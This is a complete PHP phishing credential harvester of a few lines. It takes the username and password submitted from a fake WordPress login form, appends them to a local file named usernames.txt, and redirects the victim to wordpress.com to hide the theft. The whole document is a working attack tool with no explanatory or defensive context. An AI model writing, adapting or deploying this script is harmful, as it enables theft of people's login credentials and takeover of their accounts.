<?php

file_put_contents("usernames.txt", "Account: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://wordpress.com');
exit();
